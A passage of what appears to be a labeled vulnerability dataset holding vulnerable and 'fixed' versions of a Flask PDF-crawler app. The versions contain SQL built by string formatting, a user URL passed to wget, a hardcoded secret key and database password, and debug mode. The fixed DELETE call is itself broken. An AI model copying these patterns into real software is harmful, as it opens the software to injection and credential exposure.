0: Time keeping\n    proc_start_time = time.time()\n\n    domain = session.get('domain', None)\n    if domain == None:\n        pass\n        # TODO think of bad cases\n\n    path = \"data/%s\" % (domain,)\n\n    # STEP 1: Call Helper function to create Json string\n\n    # FIXME workaround to weird file system bug with latin/ cp1252 encoding..\n    # https://stackoverflow.com/questions/35959580/non-ascii-file-name-issue-with-os-walk works\n    # https://stackoverflow.com/questions/2004137/unicodeencodeerror-on-joining-file-name doesn't work\n    hierarchy_dict = path_dict(path)  # adding ur does not work as expected either\n    hierarchy_json = json.dumps(hierarchy_dict, sort_keys=True, indent=4)  # , encoding='cp1252' not needed in python3\n\n    # FIXME remove all session stores\n\n    # STEP 2: Call helper function to count number of pdf files\n    n_files = path_number_of_files(path)\n    session['n_files'] = n_files\n\n    # STEP 3: Extract tables from pdf's\n    stats, n_error, n_success = pdf_stats(path, PDF_TO_PROCESS)\n\n    # STEP 4: Save stats\n    session['n_error'] = n_error\n    session['n_success'] = n_success\n    stats_json = json.dumps(stats, sort_keys=True, indent=4)\n    session['stats'] = stats_json\n\n    # STEP 5: Time Keeping\n    proc_over_time = time.time()\n    proc_total_time = proc_over_time - proc_start_time\n\n    # STEP 6: Save query in DB\n    # Create cursor\n    cur = mysql.connection.cursor()\n\n    # Execute query\n    cur.execute(\"INSERT INTO Crawls(cid, crawl_date, pdf_crawled, pdf_processed, process_errors, domain, url, hierarchy, stats, crawl_total_time, proc_total_time) VALUES(NULL, NULL, %s ,%s, %s, %s, %s, %s, %s, %s, %s)\",\n                (n_files, n_success, n_error, domain, session.get('url', None), hierarchy_json, stats_json, session.get('crawl_total_time', None), proc_total_time))\n\n    # Commit to DB\n    mysql.connection.commit()\n\n    # Close connection\n    cur.close()\n\n    return render_template('processing.html', n_files=n_success, domain=domain, cid=0)\n\n# Last Crawl Statistics\n@app.route('/statistics')\n@is_logged_in\ndef statistics():\n    # Create cursor\n    cur = mysql.connection.cursor()\n\n    # Get user by username\n    cur.execute(\"SELECT cid FROM Crawls WHERE crawl_date = (SELECT max(crawl_date) FROM Crawls)\")\n\n    result = cur.fetchone()\n\n    # Close connection\n    cur.close()\n\n    if result:\n        cid_last_crawl = result[\"cid\"]\n        return redirect(url_for(\"cid_statistics\", cid=cid_last_crawl))\n    else:\n        flash(\"There are no statistics to display, please start a new query and wait for it to complete.\", \"danger\")\n        return redirect(url_for(\"index\"))\n\n\n# CID specific Statistics\n@app.route('/statistics/<int:cid>')\n@is_logged_in\ndef cid_statistics(cid):\n\n    # STEP 1: retrieve all saved stats from DB\n    # Create cursor\n    cur = mysql.connection.cursor()\n\n    result = cur.execute('SELECT * FROM Crawls WHERE cid = %s' % cid)\n    crawl = cur.fetchall()[0]\n\n    # Close connection\n    cur.close();\n\n    print(session.get('stats', None))\n    print(crawl['stats'])\n\n    # STEP 2: do some processing to retrieve interesting info from stats\n    json_stats = json.loads(crawl['stats'])\n    json_hierarchy = json.loads(crawl['hierarchy'])\n\n    stats_items = json_stats.items()\n    n_tables = sum([subdict['n_tables_pages'] for filename, subdict in stats_items])\n    n_rows = sum([subdict['n_table_rows'] for filename, subdict in stats_items])\n\n    medium_tables = sum([subdict['table_sizes']['medium'] for filename, subdict in stats_items])\n    small_tables = sum([subdict['table_sizes']['small'] for filename, subdict in stats_items])\n    large_tables = sum([subdict['table_sizes']['large'] for filename, subdict in stats_items])\n\n    # Find some stats about creation dates\n    creation_dates_pdf = [subdict['creation_date'] for filename, subdict in stats_items]\n    creation_dates = list(map(lambda str : pdf_date_format_to_datetime(str), creation_dates_pdf))\n\n    if len(creation_dates) > 0:\n        oldest_pdf = min(creation_dates)\n        most_recent_pdf = max(creation_dates)\n    else:\n        oldest_pdf = \"None\"\n        most_recent_pdf = \"None\"\n\n    return render_template('statistics.html', n_files=crawl['pdf_crawled'], n_success=crawl['pdf_processed'],\n                           n_tables=n_tables, n_rows=n_rows, n_errors=crawl['process_errors'], domain=crawl['domain'],\n                           small_tables=small_tables, medium_tables=medium_tables,\n                           large_tables=large_tables, stats=json_stats, hierarchy=json_hierarchy,\n                           end_time=crawl['crawl_date'], crawl_total_time=round(crawl['crawl_total_time'] / 60.0, 1),\n                           proc_total_time=round(crawl['proc_total_time'] / 60.0, 1),\n                           oldest_pdf=oldest_pdf, most_recent_pdf=most_recent_pdf)\n\n\nclass RegisterForm(Form):\n    name = StringField('Name', [validators.Length(min=1, max=50)])\n    username = StringField('Username', [validators.Length(min=4, max=25)])\n    email = StringField('Email', [validators.Length(min=6, max=50)])\n    password = PasswordField('Password', [validators.DataRequired(),\n                                          validators.EqualTo('confirm', message='Passwords do not match')])\n    confirm = PasswordField('Confirm Password')\n\n\n# Register\n@app.route('/register', methods=['GET', 'POST'])\ndef register():\n    form = RegisterForm(request.form)\n    if request.method == 'POST' and form.validate():\n        name = form.name.data\n        email = form.email.data\n        username = form.username.data\n        password = sha256_crypt.encrypt(str(form.password.data))\n\n        # Create cursor\n        cur = mysql.connection.cursor()\n\n        # Execute query\n        cur.execute(\"INSERT INTO Users(name, email, username, password) VALUES(%s, %s, %s, %s)\",\n                    (name, email, username, password))\n\n        # Commit to DB\n        mysql.connection.commit()\n\n        # Close connection\n        cur.close()\n\n        flash('You are now registered and can log in', 'success')\n\n        return redirect(url_for('login'))\n\n    return render_template('register.html', form=form)\n\n\n# User login\n@app.route('/login', methods=['GET', 'POST'])\ndef login():\n    if request.method == 'POST':\n        # Get Form Fields\n        username = request.form['username'] # FIXME SQL_injection danger?\n        password_candidate = request.form['password']\n\n        # Create cursor\n        cur = mysql.connection.cursor()\n\n        # Get user by username\n        result = cur.execute(\"SELECT * FROM Users WHERE username = %s\", [username])\n\n        if result > 0:\n            # Get stored hash\n            data = cur.fetchone() # FIXME fucking stupid username is not primary key\n            password = data['password']\n\n            # Compare passwords\n            if sha256_crypt.verify(password_candidate, password): # FIXME how does sha256 work?\n\n                # Check was successful -> create session variables\n                session['logged_in'] = True\n                session['username'] = username\n\n                flash('You are now logged in', 'success')\n                return redirect(url_for('index'))\n            else:\n                error = 'Invalid login'\n                return render_template('login.html', error=error)\n\n        else:\n            error = 'Username not found'\n            return render_template('login.html', error=error)\n\n        # Close connection\n        cur.close() # FIXME shouldn't that happen before return?\n\n    return render_template('login.html')\n\n\n# Delete Crawl\n@app.route('/delete_crawl', methods=['POST'])\n@is_logged_in\ndef delete_crawl():\n\n        # Get Form Fields\n        cid = request.form['cid']\n\n        # Create cursor\n        cur = mysql.connection.cursor()\n\n        # Get user by username\n        result = cur.execute(\"DELETE FROM Crawls WHERE cid = %s\" % cid)\n\n        # Commit to DB\n        mysql.connection.commit()\n\n        # Close connection\n        cur.close()\n\n        # FIXME check if successfull first, return message\n        flash('Crawl successfully removed', 'success')\n\n        return redirect(url_for('dashboard'))\n\n\n# Logout\n@app.route('/logout')\n@is_logged_in\ndef logout():\n    session.clear()\n    flash('You are now logged out', 'success')\n    return redirect(url_for('login'))\n\n\n# Dashboard\n@app.route('/dashboard')\n@is_logged_in\ndef dashboard():\n\n    # Create cursor\n    cur = mysql.connection.cursor()\n\n    # Get Crawls\n    result = cur.execute(\"SELECT cid, crawl_date, pdf_crawled, pdf_processed, domain, url FROM Crawls\")\n\n    crawls = cur.fetchall()\n\n    if result > 0:\n        return render_template('dashboard.html', crawls=crawls)\n    else:\n        msg = 'No Crawls Found'\n        return render_template('dashboard.html', msg=msg)\n\n    # Close connection FIXME is this code executed\n    cur.close()\n\n\nif __name__ == '__main__':\n    app.secret_key='Aj\"$7PE#>3AC6W]`STXYLz*[G\\gQWA'\n    app.run(debug=True)\n    #app.run(host='0.0.0.0')\n\n/n/n/n", "label": 1}, {"id": "4bad3673debf0b9491b520f0e22e9186af78c375", "code": "bar.py/n/nimport subprocess\nimport shlex\nimport os\nimport signal\nfrom helper import path_dict, path_number_of_files, pdf_stats, pdf_date_format_to_datetime\nimport json\nfrom functools import wraps\nfrom urllib.parse import urlparse\n\nfrom flask import Flask, render_template, flash, redirect, url_for, session, request, logging\nfrom flask_mysqldb import MySQL\nfrom wtforms import Form, StringField, TextAreaField, PasswordField, validators\nfrom passlib.hash import sha256_crypt\nimport time\n\napp = Flask(__name__)\napp.secret_key = 'Aj\"$7PE#>3AC6W]`STXYLz*[G\\gQWA'\n\n\n# Config MySQL\napp.config['MYSQL_HOST'] = 'localhost'\napp.config['MYSQL_USER'] = 'root'\napp.config['MYSQL_PASSWORD'] = 'mountain'\napp.config['MYSQL_DB'] = 'bar'\napp.config['MYSQL_CURSORCLASS'] = 'DictCursor'\n\n# init MySQL\nmysql = MySQL(app)\n\n# CONSTANTS\nWGET_DATA_PATH = 'data'\nPDF_TO_PROCESS = 10\nMAX_CRAWLING_DURATION = 60 # 15 minutes\nWAIT_AFTER_CRAWLING = 1000\n\n\n# Helper Function\n\n# Check if user logged in\ndef is_logged_in(f):\n    @wraps(f)\n    def wrap(*args, **kwargs):\n        if 'logged_in' in session:\n            return f(*args, **kwargs)\n        else:\n            flash('Unauthorized, Please login', 'danger')\n            return redirect(url_for('login'))\n    return wrap\n\n\n# Index\n@app.route('/', methods=['GET', 'POST'])\ndef index():\n    if request.method == 'POST': #FIXME I didn't handle security yet !! make sure only logged-in people can execute\n\n        # User can type in url\n        # The url will then get parsed to extract domain, while the crawler starts at url.\n\n        # Get Form Fields and save\n        url = request.form['url']\n        parsed = urlparse(url)\n\n        session['domain'] = parsed.netloc\n        session['url'] = url\n\n        # TODO use WTForms to get validation\n\n        return redirect(url_for('crawling'))\n\n    return render_template('home.html')\n\n\n# Crawling\n@app.route('/crawling')\n@is_logged_in\ndef crawling():\n    # STEP 0: TimeKeeping\n    session['crawl_start_time'] = time.time()\n\n    # STEP 1: Prepare WGET command\n    url = session.get('url', None)\n\n    command = shlex.split(\"timeout %d wget -r -A pdf %s\" % (MAX_CRAWLING_DURATION, url,)) #FIXME timeout remove\n    #command = shlex.split(\"wget -r -A pdf %s\" % (url,))\n\n    #TODO use celery\n    #TODO give feedback how wget is doing\n\n    #TODO https://stackoverflow.com/questions/15041620/how-to-continuously-display-python-output-in-a-webpage\n\n    # STEP 2: Execute command in subdirectory\n    process = subprocess.Popen(command, cwd=WGET_DATA_PATH)\n    session['crawl_process_id'] = process.pid\n\n    return render_template('crawling.html', max_crawling_duration=MAX_CRAWLING_DURATION)\n\n\n# End Crawling Manual\n@app.route('/crawling/end')\n@is_logged_in\ndef end_crawling():\n\n    # STEP 1: Kill crawl process\n    p_id = session.get('crawl_process_id', None)\n    os.kill(p_id, signal.SIGTERM)\n\n    session['crawl_process_id'] = -1\n\n    # STEP 2: TimeKeeping\n    crawl_start_time = session.get('crawl_start_time', None)\n    session['crawl_total_time'] = time.time() - crawl_start_time\n\n    # STEP 3: Successful interruption\n    flash('You successfully interrupted the crawler', 'success')\n\n    return render_template('end_crawling.html')\n\n\n# End Crawling Automatic\n@app.route('/crawling/autoend')\n@is_logged_in\ndef autoend_crawling():\n\n    # STEP 0: Check if already interrupted\n    p_id = session.get('crawl_process_id', None)\n    if p_id < 0:\n        return \"process already killed\"\n    else:\n        # STEP 1: Kill crawl process\n        os.kill(p_id, signal.SIGTERM)\n\n        # STEP 2: TimeKeeping\n        crawl_start_time = session.get('crawl_start_time', None)\n        session['crawl_total_time'] = time.time() - crawl_start_time\n\n        # STEP 3: Successful interruption\n        flash('Time Limit reached - Crawler interrupted automatically', 'success')\n\n        return redirect(url_for(\"table_detection\"))\n\n\n# Start table detection\n@app.route('/table_detection')\n@is_logged_in\ndef table_detection():\n    return render_template('table_detection.html', wait=WAIT_AFTER_CRAWLING)\n\n\n# About\n@app.route('/about')\ndef about():\n    return render_template('about.html')\n\n\n# PDF processing\n@app.route('/processing')\n@is_logged_in\ndef processing():\n\n    # STEP 0: Time keeping\n    proc_start_time = time.time()\n\n    domain = session.get('domain', None)\n    if domain == None:\n        pass\n        # TODO think of bad cases\n\n    path = \"data/%s\" % (domain,)\n\n    # STEP 1: Call Helper function to create Json string\n\n    # FIXME workaround to weird file system bug with latin/ cp1252 encoding..\n    # https://stackoverflow.com/questions/35959580/non-ascii-file-name-issue-with-os-walk works\n    # https://stackoverflow.com/questions/2004137/unicodeencodeerror-on-joining-file-name doesn't work\n    hierarchy_dict = path_dict(path)  # adding ur does not work as expected either\n    hierarchy_json = json.dumps(hierarchy_dict, sort_keys=True, indent=4)  # , encoding='cp1252' not needed in python3\n\n    # FIXME remove all session stores\n\n    # STEP 2: Call helper function to count number of pdf files\n    n_files = path_number_of_files(path)\n    session['n_files'] = n_files\n\n    # STEP 3: Extract tables from pdf's\n    stats, n_error, n_success = pdf_stats(path, PDF_TO_PROCESS)\n\n    # STEP 4: Save stats\n    session['n_error'] = n_error\n    session['n_success'] = n_success\n    stats_json = json.dumps(stats, sort_keys=True, indent=4)\n    session['stats'] = stats_json\n\n    # STEP 5: Time Keeping\n    proc_over_time = time.time()\n    proc_total_time = proc_over_time - proc_start_time\n\n    # STEP 6: Save query in DB\n    # Create cursor\n    cur = mysql.connection.cursor()\n\n    # Execute query\n    cur.execute(\"\"\"INSERT INTO Crawls(cid, crawl_date, pdf_crawled, pdf_processed, process_errors, domain, url, hierarchy, \n                stats, crawl_total_time, proc_total_time) VALUES(NULL, NULL, %s ,%s, %s, %s, %s, %s, %s, %s, %s)\"\"\",\n                (n_files, n_success, n_error, domain, session.get('url', None), hierarchy_json,\n                stats_json, session.get('crawl_total_time', None), proc_total_time))\n\n    # Commit to DB\n    mysql.connection.commit()\n\n    # Close connection\n    cur.close()\n\n    return render_template('processing.html', n_files=n_success, domain=domain, cid=0)\n\n# Last Crawl Statistics\n@app.route('/statistics')\n@is_logged_in\ndef statistics():\n    # Create cursor\n    cur = mysql.connection.cursor()\n\n    # Get user by username\n    cur.execute(\"\"\"SELECT cid FROM Crawls WHERE crawl_date = (SELECT max(crawl_date) FROM Crawls)\"\"\")\n\n    result = cur.fetchone()\n\n    # Close connection\n    cur.close()\n\n    if result:\n        cid_last_crawl = result[\"cid\"]\n        return redirect(url_for(\"cid_statistics\", cid=cid_last_crawl))\n    else:\n        flash(\"There are no statistics to display, please start a new query and wait for it to complete.\", \"danger\")\n        return redirect(url_for(\"index\"))\n\n\n# CID specific Statistics\n@app.route('/statistics/<int:cid>')\n@is_logged_in\ndef cid_statistics(cid):\n\n    # STEP 1: retrieve all saved stats from DB\n    # Create cursor\n    cur = mysql.connection.cursor()\n\n    result = cur.execute(\"\"\"SELECT * FROM Crawls WHERE cid = %s\"\"\", (cid,))\n    crawl = cur.fetchall()[0]\n\n    # Close connection\n    cur.close();\n\n    print(session.get('stats', None))\n    print(crawl['stats'])\n\n    # STEP 2: do some processing to retrieve interesting info from stats\n    json_stats = json.loads(crawl['stats'])\n    json_hierarchy = json.loads(crawl['hierarchy'])\n\n    stats_items = json_stats.items()\n    n_tables = sum([subdict['n_tables_pages'] for filename, subdict in stats_items])\n    n_rows = sum([subdict['n_table_rows'] for filename, subdict in stats_items])\n\n    medium_tables = sum([subdict['table_sizes']['medium'] for filename, subdict in stats_items])\n    small_tables = sum([subdict['table_sizes']['small'] for filename, subdict in stats_items])\n    large_tables = sum([subdict['table_sizes']['large'] for filename, subdict in stats_items])\n\n    # Find some stats about creation dates\n    creation_dates_pdf = [subdict['creation_date'] for filename, subdict in stats_items]\n    creation_dates = list(map(lambda str : pdf_date_format_to_datetime(str), creation_dates_pdf))\n\n    if len(creation_dates) > 0:\n        oldest_pdf = min(creation_dates)\n        most_recent_pdf = max(creation_dates)\n    else:\n        oldest_pdf = \"None\"\n        most_recent_pdf = \"None\"\n\n    return render_template('statistics.html', n_files=crawl['pdf_crawled'], n_success=crawl['pdf_processed'],\n                           n_tables=n_tables, n_rows=n_rows, n_errors=crawl['process_errors'], domain=crawl['domain'],\n                           small_tables=small_tables, medium_tables=medium_tables,\n                           large_tables=large_tables, stats=json_stats, hierarchy=json_hierarchy,\n                           end_time=crawl['crawl_date'], crawl_total_time=round(crawl['crawl_total_time'] / 60.0, 1),\n                           proc_total_time=round(crawl['proc_total_time'] / 60.0, 1),\n                           oldest_pdf=oldest_pdf, most_recent_pdf=most_recent_pdf)\n\n\nclass RegisterForm(Form):\n    name = StringField('Name', [validators.Length(min=1, max=50)])\n    username = StringField('Username', [validators.Length(min=4, max=25)])\n    email = StringField('Email', [validators.Length(min=6, max=50)])\n    password = PasswordField('Password', [validators.DataRequired(),\n                                          validators.EqualTo('confirm', message='Passwords do not match')])\n    confirm = PasswordField('Confirm Password')\n\n\n# Register\n@app.route('/register', methods=['GET', 'POST'])\ndef register():\n    form = RegisterForm(request.form)\n    if request.method == 'POST' and form.validate():\n        name = form.name.data\n        email = form.email.data\n        username = form.username.data\n        password = sha256_crypt.encrypt(str(form.password.data))\n\n        # Create cursor\n        cur = mysql.connection.cursor()\n\n        # Execute query\n        cur.execute(\"INSERT INTO Users(name, email, username, password) VALUES(%s, %s, %s, %s)\",\n                    (name, email, username, password))\n\n        # Commit to DB\n        mysql.connection.commit()\n\n        # Close connection\n        cur.close()\n\n        flash('You are now registered and can log in', 'success')\n\n        return redirect(url_for('login'))\n\n    return render_template('register.html', form=form)\n\n\n# User login\n@app.route('/login', methods=['GET', 'POST'])\ndef login():\n    if request.method == 'POST':\n        # Get Form Fields\n        username = request.form['username']\n        password_candidate = request.form['password']\n\n        # Create cursor\n        cur = mysql.connection.cursor()\n\n        # Get user by username\n        result = cur.execute(\"\"\"SELECT * FROM Users WHERE username = %s\"\"\", [username])\n\n        # Note: apparently this is safe from SQL injections see\n        # https://stackoverflow.com/questions/7929364/python-best-practice-and-securest-to-connect-to-mysql-and-execute-queries/7929438#7929438\n\n        if result > 0:\n            # Get stored hash\n            data = cur.fetchone() # FIXME why is username not primary key\n            password = data['password']\n\n            # Compare passwords\n            if sha256_crypt.verify(password_candidate, password): # FIXME how does sha256 work?\n\n                # Check was successful -> create session variables\n                session['logged_in'] = True\n                session['username'] = username\n\n                flash('You are now logged in', 'success')\n                return redirect(url_for('index'))\n            else:\n                error = 'Invalid login'\n                return render_template('login.html', error=error)\n\n        else:\n            error = 'Username not found'\n            return render_template('login.html', error=error)\n\n        # Close connection\n        cur.close() # FIXME shouldn't that happen before return?\n\n    return render_template('login.html')\n\n\n# Delete Crawl\n@app.route('/delete_crawl', methods=['POST'])\n@is_logged_in\ndef delete_crawl():\n\n        # Get Form Fields\n        cid = request.form['cid']\n\n        # Create cursor\n        cur = mysql.connection.cursor()\n\n        # Get user by username\n        result = cur.execute(\"\"\"DELETE FROM Crawls WHERE cid = %s\"\"\" (cid,))\n\n        # Commit to DB\n        mysql.connection.commit()\n\n        # Close connection\n        cur.close()\n\n        # FIXME check if successfull first, return message\n        flash('Crawl successfully removed', 'success')\n\n        return redirect(url_for('dashboard'))\n\n\n# Logout\n@app.route('/logout')\n@is_logged_in\ndef logout():\n    session.clear()\n    flash('You are now logged out', 'success')\n    return redirect(url_for('login'))\n\n\n# Dashboard\n@app.route('/dashboard')\n@is_logged_in\ndef dashboard():\n\n    # Create cursor\n    cur = mysql.connection.cursor()\n\n    # Get Crawls\n    result = cur.execute(\"\"\"SELECT cid, crawl_date, pdf_crawled, pdf_processed, domain, url FROM Crawls\"\"\")\n\n    crawls = cur.fetchall()\n\n    if result > 0:\n        return render_template('dashboard.html', crawls=crawls)\n    else:\n        msg = 'No Crawls Found'\n        return render_template('dashboard.html', msg=msg)\n\n    # Close connection FIXME is this code executed\n    cur.close()\n\n\nif __name__ == '__main__':\n    app.secret_key='Aj\"$7PE#>3AC6W]`STXYLz*[G\\gQWA'\n    app.run(debug=True)\n    #app.run(host='0.0.0.0')\n\n/n/n/n", "label": 0}, {"id": "4bad3673debf0b9491b520f0e22e9186af78c375", "code": "/bar.py/n/nimport subprocess\nimport shlex\nimport os\nimport signal\nfrom helper import path_dict, path_number_of_files, pdf_stats, pdf_date_format_to_datetime\nimport json\nfrom functools import wraps\nfrom urllib.parse import urlparse\n\nfrom flask import Flask, render_template, flash, redirect, url_for, session, request, logging\nfrom flask_mysqldb import MySQL\nfrom wtforms import Form, StringField, TextAreaField, PasswordField, validators\nfrom passlib.hash import sha256_crypt\nimport time\n\napp = Flask(__name__)\napp.secret_key = 'Aj\"$7PE#>3AC6W]`STXYLz*[G\\gQWA'\n\n\n# Config MySQL\napp.config['MYSQL_HOST'] = 'localhost'\napp.config['MYSQL_USER'] = 'root'\napp.config['MYSQL_PASSWORD'] = 'mountain'\napp.config['MYSQL_DB'] = 'bar'\napp.config['MYSQL_CURSORCLASS'] = 'DictCursor'\n\n# init MySQL\nmysql = MySQL(app)\n\n# CONSTANTS\nWGET_DATA_PATH = 'data'\nPDF_TO_PROCESS = 10\nMAX_CRAWLING_DURATION = 60 # 15 minutes\nWAIT_AFTER_CRAWLING = 1000\n\n\n# Helper Function\n\n# Check if user logged in\ndef is_logged_in(f):\n    @wraps(f)\n    def wrap(*args, **kwargs):\n        if 'logged_in' in session:\n            return f(*args, **kwargs)\n        else:\n            flash('Unauthorized, Please login', 'danger')\n            return redirect(url_for('login'))\n    return wrap\n\n\n# Index\n@app.route('/', methods=['GET', 'POST'])\ndef index():\n    if request.method == 'POST': #FIXME I didn't handle security yet !! make sure only logged-in people can execute\n\n        # User can type in url\n        # The url will then get parsed to extract domain, while the crawler starts at url.\n\n        # Get Form Fields and save\n        url = request.form['url']\n        parsed = urlparse(url)\n\n        session['domain'] = parsed.netloc\n        session['url'] = url\n\n        # TODO use WTForms to get validation\n\n        return redirect(url_for('crawling'))\n\n    return render_template('home.html')\n\n\n# Crawling\n@app.route('/crawling')\n@is_logged_in\ndef crawling():\n    # STEP 0: TimeKeeping\n    session['crawl_start_time'] = time.time()\n\n    # STEP 1: Prepare WGET command\n    url = session.get('url', None)\n\n    command = shlex.split(\"timeout %d wget -r -A pdf %s\" % (MAX_CRAWLING_DURATION, url,)) #FIXME timeout remove\n    #command = shlex.split(\"wget -r -A pdf %s\" % (url,))\n\n    #TODO use celery\n    #TODO give feedback how wget is doing\n\n    #TODO https://stackoverflow.com/questions/15041620/how-to-continuously-display-python-output-in-a-webpage\n\n    # STEP 2: Execute command in subdirectory\n    process = subprocess.Popen(command, cwd=WGET_DATA_PATH)\n    session['crawl_process_id'] = process.pid\n\n    return render_template('crawling.html', max_crawling_duration=MAX_CRAWLING_DURATION)\n\n\n# End Crawling Manual\n@app.route('/crawling/end')\n@is_logged_in\ndef end_crawling():\n\n    # STEP 1: Kill crawl process\n    p_id = session.get('crawl_process_id', None)\n    os.kill(p_id, signal.SIGTERM)\n\n    session['crawl_process_id'] = -1\n\n    # STEP 2: TimeKeeping\n    crawl_start_time = session.get('crawl_start_time', None)\n    session['crawl_total_time'] = time.time() - crawl_start_time\n\n    # STEP 3: Successful interruption\n    flash('You successfully interrupted the crawler', 'success')\n\n    return render_template('end_crawling.html')\n\n\n# End Crawling Automatic\n@app.route('/crawling/autoend')\n@is_logged_in\ndef autoend_crawling():\n\n    # STEP 0: Check if already interrupted\n    p_id = session.get('crawl_process_id', None)\n    if p_id < 0:\n        return \"process already killed\"\n    else:\n        # STEP 1: Kill crawl process\n        os.kill(p_id, signal.SIGTERM)\n\n        # STEP 2: TimeKeeping\n        crawl_start_time = session.get('crawl_start_time', None)\n        session['crawl_total_time'] = time.time() - crawl_start_time\n\n        # STEP 3: Successful interruption\n        flash('Time Limit reached - Crawler interrupted automatically', 'success')\n\n        return redirect(url_for(\"table_detection\"))\n\n\n# Start table detection\n@app.route('/table_detection')\n@is_logged_in\ndef table_detection():\n    return render_template('table_detection.html', wait=WAIT_AFTER_CRAWLING)\n\n\n# About\n@app.route('/about')\ndef about():\n    return render_template('about.html')\n\n\n# PDF processing\n@app.route('/processing')\n@is_logged_in\ndef processing():\n\n    # STEP 0: Time keeping\n    proc_start_time = time.time()\n\n    domain = session.get('domain', None)\n    if domain == None:\n        pass\n        # TODO think of bad cases\n\n    path = \"data/%s\" % (domain,)\n\n    # STEP 1: Call Helper function to create Json string\n\n    # FIXME workaround to weird file system bug with latin/ cp1252 encoding..\n    # https://stackoverflow.com/questions/35959580/non-ascii-file-name-issue-with-os-walk works\n    # https://stackoverflow.com/questions/2004137/unicodeencodeerror-on-joining-file-name doesn't work\n    hierarchy_dict = path_dict(path)  # adding ur does not work as expected either\n    hierarchy_json = json.dumps(hierarchy_dict, sort_keys=True, indent=4)  # , encoding='cp1252' not needed in python3\n\n    # FIXME remove all session stores\n\n    # STEP 2: Call helper function to count number of pdf files\n    n_files = path_number_of_files(path)\n    session['n_files'] = n_files\n\n    # STEP 3: Extract tables from pdf's\n    stats, n_error, n_success = pdf_stats(path, PDF_TO_PROCESS)\n\n    # STEP 4: Save stats\n    session['n_error'] = n_error\n    session['n_success'] = n_success\n    stats_json = json.dumps(stats, sort_keys=True, indent=4)\n    session['stats'] = stats_json\n\n    # STEP 5: Time Keeping\n    proc_over_time = time.time()\n    proc_total_time = proc_over_time - proc_start_time\n\n    # STEP 6: Save query in DB\n    # Create cursor\n    cur = mysql.connection.cursor()\n\n    # Execute query\n    cur.execute(\"INSERT INTO Crawls(cid, crawl_date, pdf_crawled, pdf_processed, process_errors, domain, url, hierarchy, stats, crawl_total_time, proc_total_time) VALUES(NULL, NULL, %s ,%s, %s, %s, %s, %s, %s, %s, %s)\",\n                (n_files, n_success, n_error, domain, session.get('url', None), hierarchy_json, stats_json, session.get('crawl_total_time', None), proc_total_time))\n\n    # Commit to DB\n    mysql.connection.commit()\n\n    # Close connection\n    cur.close()\n\n    return render_template('processing.html', n_files=n_success, domain=domain, cid=0)\n\n# Last Crawl Statistics\n@app.route('/statistics')\n@is_logged_in\ndef statistics():\n    # Create cursor\n    cur = mysql.connection.cursor()\n\n    # Get user by username\n    cur.execute(\"SELECT cid FROM Crawls WHERE crawl_date = (SELECT max(crawl_date) FROM Crawls)\")\n\n    result = cur.fetchone()\n\n    # Close connection\n    cur.close()\n\n    if result:\n        cid_last_crawl = result[\"cid\"]\n        return redirect(url_for(\"cid_statistics\", cid=cid_last_crawl))\n    else:\n        flash(\"There are no statistics to display, please start a new query and wait for it to complete.\", \"danger\")\n        return redirect(url_for(\"index\"))\n\n\n# CID specific Statistics\n@app.route('/statistics/<int:cid>')\n@is_logged_in\ndef cid_statistics(cid):\n\n    # STEP 1: retrieve all saved stats from DB\n    # Create cursor\n    cur = mysql.connection.cursor()\n\n    result = cur.execute('SELECT * FROM Crawls WHERE cid = %s' % cid)\n    crawl = cur.fetchall()[0]\n\n    # Close connection\n    cur.close();\n\n    print(session.get('stats', None))\n    print(crawl['stats'])\n\n    # STEP 2: do some processing to retrieve interesting info from stats\n    json_stats = json.loads(crawl['stats'])\n    json_hierarchy = json.loads(crawl['hierarchy'])\n\n    stats_items = json_stats.items()\n    n_tables = sum([subdict['n_tables_pages'] for filename, subdict in stats_items])\n    n_rows = sum([subdict['n_table_rows'] for filename, subdict in stats_items])\n\n    medium_tables = sum([subdict['table_sizes']['medium'] for filename, subdict in stats_items])\n    small_tables = sum([subdict['table_sizes']['small'] for filename, subdict in stats_items])\n    large_tables = sum([subdict['table_sizes']['large'] for filename, subdict in stats_items])\n\n    # Find some stats about creation dates\n    creation_dates_pdf = [subdict['creation_date'] for filename, subdict in stats_items]\n    creation_dates = list(map(lambda str : pdf_date_format_to_datetime(str), creation_dates_pdf))\n\n    if len(creation_dates) > 0:\n        oldest_pdf = min(creation_dates)\n        most_recent_pdf = max(creation_dates)\n    else:\n        oldest_pdf = \"None\"\n        most_recent_pdf = \"None\"\n\n    return render_template('statistics.html', n_files=crawl['pdf_crawled'], n_success=crawl['pdf_processed'],\n                           n_tables=n_tables, n_rows=n_rows, n_errors=crawl['process_errors'], domain=crawl['domain'],\n                           small_tables=small_tables, medium_tables=medium_tables,\n                           large_tables=large_tables, stats=json_stats, hierarchy=json_hierarchy,\n                           end_time=crawl['crawl_date'], crawl_total_time=round(crawl['crawl_total_time'] / 60.0, 1),\n                           proc_total_time=round(crawl['proc_total_time'] / 60.0, 1),\n                           oldest_pdf=oldest_pdf, most_recent_pdf=most_recent_pdf)\n\n\nclass RegisterForm(Form):\n    name = StringField('Name', [validators.Length(min=1, max=50)])\n    username = StringField('Username', [validators.Length(min=4, max=25)])\n    email = StringField('Email', [validators.Length(min=6, max=50)])\n    password = PasswordField('Password', [validators.DataRequired(),\n                                          validators.EqualTo('confirm', message='Passwords do not match')])\n    confirm = PasswordField('Confirm Password')\n\n\n# Register\n@app.route('/register', methods=['GET', 'POST'])\ndef register():\n    form = RegisterForm(request.form)\n    if request.method == 'POST' and form.validate():\n        name = form.name.data\n        email = form.email.data\n        username = form.username.data\n        password = sha256_crypt.encrypt(str(form.password.data))\n\n        # Create cursor\n        cur = mysql.connection.cursor()\n\n        # Execute query\n        cur.execute(\"INSERT INTO Users(name, email, username, password) VALUES(%s, %s, %s, %s)\",\n                    (name, email, username, password))\n\n        # Commit to DB\n        mysql.connection.commit()\n\n        # Close connection\n        cur.close()\n\n        flash('You are now registered and can log in', 'success')\n\n        return redirect(url_for('login'))\n\n    return render_template('register.html', form=form)\n\n\n# User login\n@app.route('/login', methods=['GET', 'POST'])\ndef login():\n    if request.method == 'POST':\n        # Get Form Fields\n        username = request.form['username'] # FIXME SQL_injection danger?\n        password_candidate = request.form['password']\n\n        # Create cursor\n        cur = mysql.connection.cursor()\n\n        # Get user by username\n        result = cur.execute(\"SELECT * FROM Users WHERE username = %s\", [username])\n\n        if result > 0:\n            # Get stored hash\n            data = cur.fetchone() # FIXME fucking stupid username is not primary key\n            password = data['password']\n\n            # Compare passwords\n            if sha256_crypt.verify(password_candidate, password): # FIXME how does sha256 work?\n\n                # Check was successful -> create session variables\n                session['logged_in'] = True\n                session['username'] = username\n\n                flash('You are now logged in', 